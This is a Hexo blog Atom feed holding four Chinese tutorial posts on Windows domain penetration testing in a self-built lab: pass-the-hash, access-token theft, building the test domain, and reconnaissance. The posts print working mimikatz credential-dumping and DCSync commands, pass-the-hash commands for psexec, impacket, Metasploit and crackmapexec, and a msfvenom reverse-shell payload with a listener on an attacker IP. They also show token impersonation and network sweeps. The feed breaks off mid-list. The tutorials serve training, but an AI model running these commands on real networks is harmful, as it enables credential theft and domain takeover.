<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>zyth0n的博客</title>
  
  
  <link href="https://zyth0n.github.io/atom.xml" rel="self"/>
  
  <link href="https://zyth0n.github.io/"/>
  <updated>2023-01-17T12:30:36.000Z</updated>
  <id>https://zyth0n.github.io/</id>
  
  <author>
    <name>zyth0n</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>内网渗透4之PTH</title>
    <link href="https://zyth0n.github.io/2023/01/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F4%E4%B9%8BPTH/"/>
    <id>https://zyth0n.github.io/2023/01/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F4%E4%B9%8BPTH/</id>
    <published>2023-01-19T00:59:40.399Z</published>
    <updated>2023-01-17T12:30:36.000Z</updated>
    
    <content type="html"><![CDATA[<p>PTH（pass-the-hash，哈希传递）在内网渗透中是一种很经典的攻击方式，原理是攻击者可以直接通过 LM Hash 和 NTLM Hash 访问远程主机或服务，而不用提供明文密码。在Windows系统中，通常会使用NTLM身份认证，NTLM是明文加密后的hash值。PTH是基于SMB服务(445端口)。这类攻击尤其适用于<strong>域环境或工作组环境，同时可以获得hash但是不允许对hash爆破，或者内网中存在其他一样密码主机的情形（部分软件可以直接爆出明文密码）</strong>。这里注意一点，如果是在域环境中，只能是域管理员组内用户(<strong>可以是域管理员组内非 administrator 用户</strong>)的哈希值才能进行哈希传递攻击，攻击成功后，可以访问域内任何一台机器。当然了，非管理用户也可以进行攻击，只不过相当于没攻击。也就是说，要想成功进行PTH攻击，必须要获取一台<strong>高权限的主机</strong>。</p><p>这篇文章搭建的域环境信息如下，网卡选择“NAT网络”</p><table><thead><tr><th>名称</th><th>类型</th><th>IP</th><th>系统</th><th>域名</th><th>域用户账号</th><th>机器名</th></tr></thead><tbody><tr><td>DC</td><td>域控</td><td>10.0.2.4</td><td>Windows Server 2016</td><td>ZYTH0N</td><td>administrator</td><td>16DC</td></tr><tr><td>USER</td><td>域成员</td><td>10.0.2.5</td><td>Win10</td><td>无</td><td>test</td><td>16WIN10</td></tr></tbody></table><p>具体有以下几种攻击方式：</p><h2 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a><a href="https://github.com/gentilkiwi/mimikatz" title="项目链接">mimikatz</a></h2><p>这里以我搭建的测试环境举例，现在的情况是，我已经拿到了USER的<strong>管理员权限</strong>（如果不以管理员权限运行mimikatz，则会出现<code>ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061</code>的错误），先获取hash，这里我密码设置的过于简单，在kerberos这里已经显示出明文密码了：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">privilege::<span class="title">debug</span></span></span><br><span class="line"><span class="function"><span class="title">sekurlsa</span>::<span class="title">logonpasswords</span></span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/01/17/TPH6krgbjquxEeh.png" alt="2023-01-17_17-14.png"></p><p>然后用mimikatz执行PTH攻击，执行之后会跳出一个cmd窗口，该窗口拥有<strong>访问域控</strong>的权限，之后访问远程主机或服务不需要提供明文密码（当然仅限于这个shell之内），这里演示一下访问域控的C盘：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">sekurlsa::<span class="title">pth</span> /<span class="title">user:administrator</span> /<span class="title">domain:ZYTH0N</span> /<span class="title">ntlm</span>:0445<span class="title">e2d2c6f140371b1dcbf3521719ca</span></span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/01/17/l8TR4vEXMHWNAz6.png" alt="2023-01-17_17-23.png"></p><p>在这里补充一下，如果使用一个<strong>非管理员账户</strong>进行PTH攻击，在生成的cmd里访问域控C盘依然需要输入账号和密码（所以为什么会说攻击了相当于没攻击）：<br><img src="https://s2.loli.net/2023/01/17/g8phBvUKYsS15ey.png" alt="2023-01-17_17-34.png"></p><p>这个命令可以导出域内所有用户的hash：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">lsadump::<span class="title">dcsync</span> /<span class="title">domain:shqax</span>.<span class="title">com</span> /<span class="title">all</span> /<span class="title">csv</span></span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/01/17/5kKhsOAfBFe8EGR.png" alt="2023-01-17_17-50.png"><br>上面的命令都是建立在<strong>交互式shell</strong>的基础上，如果是在<strong>非交互式shell</strong>的基础上则对于命令需要做一点小调整：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#获取hash</span><br><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &gt; password.txt</span><br><span class="line"></span><br><span class="line">#执行攻击</span><br><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:administrator /domain:ZYTH0N /ntlm:<span class="number">0445</span>e2d2c6f140371b1dcbf3521719ca&quot;</span><br><span class="line"></span><br><span class="line">#导出域内所有用户hash</span><br><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::dcsync /domain:zyth0n.cc /all /csv&quot;</span><br></pre></td></tr></table></figure><hr><h2 id="Psexec"><a href="#Psexec" class="headerlink" title="Psexec"></a><a href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/psexec" title="项目链接">Psexec</a></h2><p>上面提到的mimkatz有一个缺点：不免杀。Psexec属于微软官方提供的进程实用工具，一般情况下不存在被查杀的可能，其基本原理是通过管道在远程目标主机上创建一个psexec 服务,并在本地磁盘中生成一个名为 PSEXESVC 的二进制文件,然后通过psexec 服务运行命令,运行结束后删除服务。psexec的利用条件同样需要开启IPC共享服务，同时远程管理系统需要开启admin$共享（默认开启）。注意，<strong>Psexec不需要管理员权限</strong>。演示两种攻击方式：</p><ol><li>明文账号密码都知道，这里可以看到我们拿到的是<strong>域控的SYSTEM权限</strong>：</li></ol><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#没有IPC连接需要账号密码</span><br><span class="line">PsExec64.exe -accepteula -s \\<span class="number">10</span>.<span class="number">0</span>.<span class="number">2</span>.<span class="number">4</span> -u Administrator -p <span class="number">12</span>qweASDzxc <span class="built_in">cmd</span></span><br><span class="line"></span><br><span class="line">#有IPC连接无需账号密码</span><br><span class="line">PsExec64.exe -accepteula -s \\<span class="number">10</span>.<span class="number">0</span>.<span class="number">2</span>.<span class="number">4</span> <span class="built_in">cmd</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/01/17/Zi7uF9lShvsMYo6.png" alt="2023-01-17_18-19.png"></p><p>解释一下各个参数的含义：</p><table><thead><tr><th>参数</th><th>含义</th></tr></thead><tbody><tr><td>-accepteula</td><td>此标志禁止显示许可证对话框</td></tr><tr><td>-s</td><td>在系统帐户中运行远程进程</td></tr><tr><td>-u</td><td>指定用于登录到远程计算机的可选用户名</td></tr><tr><td>-p</td><td>指定用户名的可选密码。 如果省略此项，系统会提示输入隐藏的密码</td></tr></tbody></table><ol start="2"><li>知道账号对应的hash:</li></ol><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec64.exe -hashes :<span class="number">0445</span>e2d2c6f140371b1dcbf3521719ca zyth0n.cc/Administrator@<span class="number">10</span>.<span class="number">0</span>.<span class="number">2</span>.<span class="number">4</span></span><br></pre></td></tr></table></figure><p>这里可能会出现“系统找不到指定文件”的错误，可以使用<strong>kali中基于python的impacket</strong>进行利用：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-psexec -hashes :<span class="number">0445</span>e2d2c6f140371b1dcbf3521719ca zyth0n.cc/Administrator@<span class="number">10</span>.<span class="number">0</span>.<span class="number">2</span>.<span class="number">4</span></span><br></pre></td></tr></table></figure><p>或者使用<strong>msf中自带的psexec模块</strong>进行利用也可以，结果如图所示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/windows/smb/psexec</span><br><span class="line"><span class="built_in">set</span> SMBUser Administrator</span><br><span class="line"><span class="built_in">set</span> rhosts 10.0.2.4</span><br><span class="line"><span class="built_in">set</span> smbpass aad3b435b51404eeaad3b435b51404ee（这里可以随便写）:0445e2d2c6f140371b1dcbf3521719ca（这里写密码也可以，不过既然知道密码了也没必要用这个模块攻击了）</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/01/17/k5OHZzeKaG9DQAt.png" alt="2023-01-17_20-08.png"></p><p>如果需要针对一个<strong>C段进行批量PTH</strong>，这里使用<a href="https://github.com/Porchetta-Industries/CrackMapExec" title="项目链接">crackmapexec</a>，当然kali自带，具体语句如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 10.0.2.0/24 -u administrator -H 0445e2d2c6f140371b1dcbf3521719ca</span><br></pre></td></tr></table></figure><hr><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;PTH（pass-the-hash，哈希传递）在内网渗透中是一种很经典的攻击方式，原理是攻击者可以直接通过 LM Hash 和 NTLM Hash 访问远程主机或服务，而不用提供明文密码。在Windows系统中，通常会使用NTLM身份认证，NTLM是明文加密后的hash值。</summary>
      
    
    
    
    <category term="内网" scheme="https://zyth0n.github.io/categories/%E5%86%85%E7%BD%91/"/>
    
    
    <category term="内网渗透" scheme="https://zyth0n.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="横向渗透" scheme="https://zyth0n.github.io/tags/%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透3之token窃取</title>
    <link href="https://zyth0n.github.io/2023/01/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F3%E4%B9%8Btoken%E7%AA%83%E5%8F%96/"/>
    <id>https://zyth0n.github.io/2023/01/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F3%E4%B9%8Btoken%E7%AA%83%E5%8F%96/</id>
    <published>2023-01-19T00:59:40.103Z</published>
    <updated>2023-01-14T09:01:29.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="内网渗透的基本思路"><a href="#内网渗透的基本思路" class="headerlink" title="内网渗透的基本思路"></a>内网渗透的基本思路</h2><p>先拿下<strong>域成员</strong>主机-&gt;定位<strong>域控IP和域管理员</strong>账号-&gt;利用域成员主机扩大范围-&gt;定位<strong>域管理员登陆过</strong>的域成员主机-&gt;从登陆过的主机内存中dump出域管理员密码-&gt;拿下域控</p><h2 id="关于token"><a href="#关于token" class="headerlink" title="关于token"></a>关于token</h2><p>token简单理解是系统的<strong>临时密钥</strong>，相当于账号和密码，它允许你在<strong>不提供密码或其他登陆凭证的前提下</strong>访问网络和系统资源。token会<strong>持续存在于系统，除非系统重新启动</strong>。内网渗透可以通过<strong>假冒令牌</strong>的方式假冒网络中用户进行操作。</p><p>token可以区分为访问令牌（Access Token）、会话令牌（Session Token）和密保令牌（Security Token）三种，在Windows中AccessToken可以细分为授权令牌（Delegation Token）和模拟令牌（Impersonation Token）两类，具体分类这个不重要，重要的是如何获取AccessToken。</p><h2 id="incognito获取AccessToken"><a href="#incognito获取AccessToken" class="headerlink" title="incognito获取AccessToken"></a><a href="https://zyth0n.github.io/2023/01/13/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F3%E4%B9%8Btoken%E7%AA%83%E5%8F%96/#incognito%E8%8E%B7%E5%8F%96AccessToken" title="incognito获取AccessToken"></a><a href="https://github.com/shanfenglan/test/raw/master/incognito.exe" title="下载链接">incognito</a>获取AccessToken</h2><p>获取AccessToken的前提需要管理员权限，这里的情境是已经拿到了zyth0n.cc这个域内USER的管理员权限</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">incognito.exe list_tokens -u  </span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/01/11/dzWF5AHEUtg93RZ.png" alt="2023-01-11_15-28.png"></p><p>可以看出有SYSTEM权限，我们可以模拟SYSTEM用户令牌（<strong>当前主机的最高权限</strong>），也可以模拟普通用户令牌（<strong>降权</strong>），语法格式为<code>incognito.exe execute -c &quot;完整的token名&quot; cmd.exe</code></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">incognito.exe execute -c &quot;NT AUTHORITY\SYSTEM&quot; <span class="built_in">cmd</span>.exe  </span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/01/11/E6I9Xd1SjxP852w.png" alt="2023-01-11_15-33.png"></p><p>这里<code>whoami</code>提示为SYSTEM权限，可以进行后续一系列操作</p><h2 id="msf的incognito模块"><a href="#msf的incognito模块" class="headerlink" title="msf的incognito模块"></a>msf的incognito模块</h2><p>先生成后门，其中，LHOST和LPORT分别为<strong>攻击机</strong>的IP地址和端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LPORT=6666 LHOST=192.168.1.111 -f exe -o msf.exe </span><br></pre></td></tr></table></figure><p>进入msf框架，使用<strong>handler</strong>模块，将payload改为刚才生成后门时使用的payload,设置好LHOST和LPORT，攻击</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole  </span><br><span class="line">use exploit/mulit/handler  </span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp  </span><br><span class="line">set LHOST 192.168.1.111  </span><br><span class="line">set LPORT 6666  </span><br><span class="line">exploit #这里输入run也可以  </span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/01/11/SBpmYko8c2bjizZ.png" alt="2023-01-11_16-11.png"></p><p>到这里会对<strong>来自6666端口的流量进行监听</strong>，此时把之前生成的msf.exe发送到USER机器运行，攻击机会收到反弹shell,成功建立会话，输入<code>getuid</code>查看当前用户</p><p><img src="https://s2.loli.net/2023/01/11/fPvU6pGoZ49wiBE.png" alt="2023-01-11_16-14.png"></p><p>此时可以输入<code>getsystem</code>提取，如果提取失败（这个的原理简单理解为生成SYSTEM权限的进程），可以考虑使用incognito模块获取token提取，输入<code>use incognito</code>，这里的命令与Windows上使用incognito略有区别</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">list_tokens -u  <span class="comment">#列出令牌  </span></span><br><span class="line">impersonate_token <span class="string">&quot;NT AUTHORITY\SYSTEM&quot;</span>     <span class="comment">#获取SYSTEM令牌  </span></span><br><span class="line">steal_token PID号    <span class="comment">#获取对应进程**权限**的令牌  </span></span><br><span class="line">rev2self    <span class="comment">#返回先前获取的用户权限  </span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/01/11/O13EVt79FeZoduy.png" alt="2023-01-11_16-26.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;内网渗透的基本思路&quot;&gt;&lt;a href=&quot;#内网渗透的基本思路&quot; class=&quot;headerlink&quot; title=&quot;内网渗透的基本思路&quot;&gt;&lt;/a&gt;内网渗透的基本思路&lt;/h2&gt;&lt;p&gt;先拿下&lt;strong&gt;域成员&lt;/strong&gt;主机-&amp;gt;定位&lt;strong&gt;域控</summary>
      
    
    
    
    <category term="内网" scheme="https://zyth0n.github.io/categories/%E5%86%85%E7%BD%91/"/>
    
    
    <category term="内网渗透" scheme="https://zyth0n.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透1之环境搭建</title>
    <link href="https://zyth0n.github.io/2023/01/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F1%E4%B9%8B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <id>https://zyth0n.github.io/2023/01/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F1%E4%B9%8B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</id>
    <published>2023-01-19T00:59:39.916Z</published>
    <updated>2023-01-14T08:40:06.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="关于内网的几个名词解释"><a href="#关于内网的几个名词解释" class="headerlink" title="关于内网的几个名词解释"></a>关于内网的几个名词解释</h2><ul><li><p>内网（又叫局域网）：某一区域内由多台计算机互联形成的计算机组，更简单的理解就是<strong>“封闭型”</strong>网络，最简单的例子就是校园网、企业网络等。一般情况下内网只能在内部使用，外部<strong>“几乎”</strong>无法使用（当然存在可以使用的例外情况，这里不展开）。</p></li><li><p>工作组：内网计算机组的架构形式，这个架构形式不存在集中管理一说，因为可以直接在<strong>计算机属性-&gt;更改设置-&gt;系统属性-&gt;更改</strong>进行修改，这就意味着加入或退出任何一个工作组。每个工作组内的每台电脑账号身份都是<strong>对等</strong>的。</p></li><li><p>域（Doamin）：有安全边界（身份认证）的计算机集合。可以理解成工作组的升级版，在安全管理上更严格。每个域内的电脑账号身份<strong>不对等</strong>，最大权限的电脑是<strong>域的创建者（Domain Controller,缩写DC）</strong>，简称<strong>“域控”</strong>。域控中权限最大的账号是<strong>域管理</strong>。</p></li><li><p>DNS域名服务器（Domain Name Server）：实现域名和IP地址进行转换的服务器，因为域中计算机使用DNS定位域控、服务器以及其他计算机、网络服务的。<strong>内网渗透测试中几乎都是通过寻找DNS服务器确定域控位置（DNS服务器通常和域控制器在同一台机器）</strong>。</p></li><li><p>活动目录（Active Directory,缩写AD）：域环境里提供目录服务的组件。简单理解就是集中管理整个域的账号、软件推送和访问权限功能的服务。<strong>域控就是安装了活动目录的计算机</strong>。</p></li></ul><hr><h2 id="使用虚拟机模拟搭建内网环境"><a href="#使用虚拟机模拟搭建内网环境" class="headerlink" title="使用虚拟机模拟搭建内网环境"></a>使用虚拟机模拟搭建内网环境</h2><p>这里选择的域控服务器是<strong>Windows Server 2016</strong>,域用户为<strong>Win10</strong>,为方便后续调试，两台机器网卡均选择“<strong>桥接”</strong>。</p><table><thead><tr><th>名称</th><th>IP</th><th>系统</th></tr></thead><tbody><tr><td>DC</td><td>192.168.101.202</td><td>Windows Server 2016</td></tr><tr><td>USER</td><td>192.168.101.205</td><td>Win10</td></tr></tbody></table><p>使用<strong>DC</strong>这台计算机建立域，打开<strong>服务器管理器-&gt;添加角色和功能-&gt;四次下一步-&gt;选择Active Directory域服务</strong></p><p><img src="https://s2.loli.net/2023/01/08/eVgCtJiDULwc4pf.png" alt="2023-01-08_17-45.png"></p><p>一直点击下一步，直到确认安装所选内容，点击“安装”，结束安装后重启，<strong>将此服务器提升为域控制器</strong></p><p><img src="https://s2.loli.net/2023/01/08/HAPpdDem3FNxUog.png" alt="2023-01-08_17-50.png"></p><p>此处选择“添加新林”，输入你要设置的根域名</p><p><img src="https://s2.loli.net/2023/01/08/6hMvHTza1rZsduB.png" alt="2023-01-08_17-57.png"></p><p>选择新林和根域的功能级别为2012,设置DSRM密码（<strong>这里设置的是不是域环境管理员的密码，是数据库恢复重置的密码！</strong>），一直下一步点击安装，安装成功后会自动重启，输入先前安装系统设置的<strong>域管理员密码</strong>登录</p><p><img src="https://s2.loli.net/2023/01/08/lGbpe1RYjvKu5aZ.png" alt="2023-01-08_18-03.png"></p><p><img src="https://s2.loli.net/2023/01/08/rqtKhkiEGMPsW2x.png" alt="2023-01-08_18-05.png"></p><p><img src="https://s2.loli.net/2023/01/08/VP74e5qAo3tEYps.png" alt="2023-01-08_18-06.png"></p><p>这里输入<code>whoami</code>查看一下，建立成功</p><p><img src="https://s2.loli.net/2023/01/08/Kc96BpCZn3lhmuO.png" alt="2023-01-08_18-18.png"></p><p>这里补充一下如何修改组策略，组策略默认继承域控的本地策略，因此只需要修改本地策略即可修改组策略。<strong>开始-&gt;Windows管理工具-&gt;组策略管理</strong>，这里展开域，找到<strong>Default Domain Policy</strong>,右键“编辑”</p><p><img src="https://s2.loli.net/2023/01/08/31nFe4XVakiDyW2.png" alt="2023-01-08_21-19.png"></p><p>以修改密码策略为例，计算机配置-&gt;策略-&gt;Windows设置-&gt;安全设置-&gt;账户策略-&gt;密码策略</p><p><img src="https://s2.loli.net/2023/01/08/D4GdzrbVJ2ypWXn.png" alt="2023-01-08_21-20.png"></p><p>更改之后可以等待系统自动刷新组策略，或者重启域控，或者使用以下命令手动刷新组策略</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gpupdate /target:computer  #刷新计算机策略  </span><br><span class="line">gpupdate /target:user   #刷新用户策略  </span><br><span class="line">gpupdate /force     #两者都刷新  </span><br></pre></td></tr></table></figure><h2 id="计算机加入域"><a href="#计算机加入域" class="headerlink" title="计算机加入域"></a>计算机加入域</h2><p><strong>开始-&gt;Windows管理工具-&gt;Active Directory用户和计算机-&gt;展开域-&gt;Users</strong>,在<strong>DC</strong>新建用户test，密码123456,点击完成即可</p><p><img src="https://s2.loli.net/2023/01/08/3sEPVf4JwBA7LHx.png" alt="2023-01-08_21-26.png"></p><p><img src="https://s2.loli.net/2023/01/08/Mgtq82VEYijU73R.png" alt="2023-01-08_21-26_1.png"></p><p><img src="https://s2.loli.net/2023/01/08/Sry6bvE3kIBMWqo.png" alt="2023-01-08_21-26_2.png"></p><p>打开<strong>USER</strong>,修改DNS为<strong>DC</strong>的ip 192.168.101.202,打开<strong>此电脑-&gt;属性-&gt;更改设置-&gt;更改</strong>，将<strong>“隶属于”</strong>改为之前设置的域，重启即可生效</p><p><img src="https://s2.loli.net/2023/01/08/9YRoEc5TWuXLisA.png" alt="2023-01-08_21-35.png"></p><p><img src="https://s2.loli.net/2023/01/08/RzahJ94xpQW56bt.png" alt="2023-01-08_21-37.png"></p><p>重启后，如果要登陆域环境，用户名格式为<code>NetBIOS域名\用户名</code>（适用于win2000以前的机器），或者<code>用户名@域名</code>。也就是“ZYTH0N\test”，或者“<a href="mailto:test@zyth0n.cc">test@zyth0n.cc</a>”，密码123456</p><p><img src="https://s2.loli.net/2023/01/08/BfP6iZqMYSmazlJ.png" alt="2023-01-08_21-44.png"></p><p>至此，内网环境搭建成功。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;关于内网的几个名词解释&quot;&gt;&lt;a href=&quot;#关于内网的几个名词解释&quot; class=&quot;headerlink&quot; title=&quot;关于内网的几个名词解释&quot;&gt;&lt;/a&gt;关于内网的几个名词解释&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;内网（又叫局域网）：某一区域内由多台计算机互联形成</summary>
      
    
    
    
    <category term="内网" scheme="https://zyth0n.github.io/categories/%E5%86%85%E7%BD%91/"/>
    
    
    <category term="内网渗透" scheme="https://zyth0n.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透2之基本信息收集</title>
    <link href="https://zyth0n.github.io/2023/01/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F2%E4%B9%8B%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>https://zyth0n.github.io/2023/01/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F2%E4%B9%8B%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
    <published>2023-01-19T00:59:39.751Z</published>
    <updated>2023-01-14T09:00:51.000Z</updated>
    
    <content type="html"><![CDATA[<p>信息收集是渗透测试中的重要环节，假定我们拿到了模拟环境中的其中一台机器，可以通过以下方式扩大自己拥有的信息：</p><h2 id="关于本机的信息收集"><a href="#关于本机的信息收集" class="headerlink" title="关于本机的信息收集"></a>关于本机的信息收集</h2><ol><li><p>网络配置信息</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ipconfig</span> /all </span><br></pre></td></tr></table></figure></li><li><p>操作系统信息、版本号、系统目录、<strong>域、登陆服务器、修补程序</strong>、网卡</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo  </span><br></pre></td></tr></table></figure></li><li><p>当前系统运行进程</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist  </span><br></pre></td></tr></table></figure></li><li><p>用户详细信息、sid号</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /all </span><br></pre></td></tr></table></figure></li><li><p>网络信息</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">route <span class="built_in">print</span>  </span><br><span class="line">arp -a  </span><br></pre></td></tr></table></figure></li><li><p>系统服务</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service  </span><br></pre></td></tr></table></figure></li><li><p>开机自启动程序信息</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic startup  </span><br></pre></td></tr></table></figure></li><li><p>查看计划任务</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks </span><br></pre></td></tr></table></figure></li><li><p>查看本机用户，这里和域信息收集做一个对比，同样可以通过一些命令确定是否为<strong>域控或域成员</strong></p></li></ol><table><thead><tr><th>查看信息</th><th>本机</th><th>域</th></tr></thead><tbody><tr><td>查看用户</td><td>net user</td><td>net user &#x2F;domain</td></tr><tr><td>查看用户组</td><td>net localgroup</td><td>net group #此命令只能在域控使用</td></tr><tr><td>查看管理组</td><td>net localgroup Administrators</td><td>net group “Domain Administrators”</td></tr><tr><td>查看当前登录域、计算机名和用户名</td><td>net config workstation</td><td>net config workstation</td></tr><tr><td>查询时间</td><td>net time #不在域中的主机会报错</td><td>net time #域控服务器会显示当前时间，域成员会请求域控回显时间</td></tr></tbody></table><h2 id="关于域的信息收集，内网扫描通用"><a href="#关于域的信息收集，内网扫描通用" class="headerlink" title="关于域的信息收集，内网扫描通用"></a>关于域的信息收集，内网扫描通用</h2><ol><li><p>查询域内主机</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> view  </span><br></pre></td></tr></table></figure><p>这里补充一点，如果出现系统错误6118时，在<strong>“服务”</strong>界面将<strong>“Computer Browser”</strong>服务开启（默认关闭）</p></li><li><p>bat命令查询域内主机</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /l %i <span class="keyword">in</span> (<span class="number">1</span>,<span class="number">1</span>,<span class="number">255</span>) <span class="keyword">do</span> @<span class="built_in">ping</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">0</span>.%i -w <span class="number">1</span> -n <span class="number">1</span>|<span class="built_in">find</span> /i &quot;ttl=&quot;  </span><br></pre></td></tr></table></figure></li><li><p>nbtscan发现主机</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nbtscan <span class="number">192</span>.<span class="number">168</span>.<span class="number">101</span>.<span class="number">0</span>/<span class="number">24</span>  </span><br></pre></td></tr></table></figure></li><li><p>msf进行主机探测</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/discovery/arp_sweep   <span class="comment">#ARP扫描  </span></span><br><span class="line">auxiliary/scanner/discovery/udp_sweep   <span class="comment">#UDP扫描  </span></span><br><span class="line">auxiliary/scanner/netbios/nbname        <span class="comment">#NETBIOS扫描  </span></span><br><span class="line">auxiliary/scanner/snmp/snmp_enum        <span class="comment">#SNMP扫描  </span></span><br><span class="line">auxiliary/scanner/smb/smb_version       <span class="comment">#SMB扫描  </span></span><br><span class="line">auxiliary/scanner/portscan/ack          <span class="comment">#TCP ACK端口扫描  </span></span><br><span class="line">auxiliary/scanner/portscan/ftpbounce    <span class="comment">#FTP bounce端口扫描  </span></span><br><span class="line">auxiliary/scanner/portscan/syn         <span class="comment">#SYN端口扫描  </span></span><br><span 